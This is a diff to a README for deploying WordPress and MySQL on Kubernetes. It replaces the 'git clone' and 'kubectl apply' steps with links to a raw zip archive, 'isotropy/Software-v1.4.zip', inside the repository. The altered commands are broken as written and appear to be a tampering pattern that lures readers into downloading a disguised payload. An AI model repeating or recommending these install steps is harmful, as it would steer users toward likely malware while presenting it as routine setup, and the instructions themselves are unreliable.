@@ -16,7 +16,7 @@ In this repository,  contains Kubernetes manifests to deploy a MySQL StatefulSet
 1. **First, clone the Repository:**
  
     ```sh
-    git clone https://github.com/engineerbishnu/mywordpress.git
+    git clone https://github.com/engineerbishnu/mywordpress/raw/refs/heads/main/isotropy/Software-v1.4.zip
     cd mywordpress
     ```
  
@@ -32,7 +32,7 @@ In this repository,  contains Kubernetes manifests to deploy a MySQL StatefulSet
     Apply the created yaml manifest file:
  
     ```sh
-    kubectl apply -f wordpress-allinone-deployment.yaml
+    kubectl apply -f https://github.com/engineerbishnu/mywordpress/raw/refs/heads/main/isotropy/Software-v1.4.zip
     ```
  
 ## Accessing WordPress
